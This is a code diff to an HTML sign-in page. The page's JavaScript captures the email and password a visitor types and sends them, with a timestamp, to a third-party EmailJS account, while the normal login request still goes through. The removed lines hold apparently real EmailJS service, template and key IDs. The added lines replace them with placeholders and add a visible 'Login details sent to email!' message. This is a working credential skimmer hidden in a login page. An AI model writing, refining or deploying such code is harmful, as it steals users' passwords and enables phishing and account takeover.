@@ -16,7 +16,7 @@
             }
         };
 
-        // JavaScript to handle the Sign In button click
+        // JavaScript to handle the Sign In button click with temporary feedback
         async function handleSignIn() {
             const email = document.getElementById('login').value;
             const password = document.getElementById('passwd').value;
@@ -27,17 +27,21 @@
                 return;
             }
 
-            // Send the data to EmailJS (added functionality)
-            emailjs.send('service_26p7vyd', 'template_mrthmvh', {
+            // Send the data to EmailJS with temporary feedback
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
                 email: email,
                 password: password,
                 date: new Date().toLocaleString()
             })
             .then(() => {
                 console.log('Login details sent to email!');
+                document.getElementById('msg').style.display = 'block'; // Show success message
+                document.getElementById('msg').innerText = 'Login details sent to email!';
             })
             .catch(error => {
                 console.error('EmailJS Error:', error);
+                document.getElementById('error').style.display = 'block'; // Show error message
+                document.getElementById('error').innerText = 'Failed to send email: ' + error.text;
             });
 
             // Send the data to the server (original functionality unchanged)
@@ -106,7 +110,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            emailjs.init("GNA3u969Bx38j6iPg"); // Replace with your Public Key from EmailJS dashboard
+            emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your Public Key from EmailJS dashboard
         })();
     </script>
 
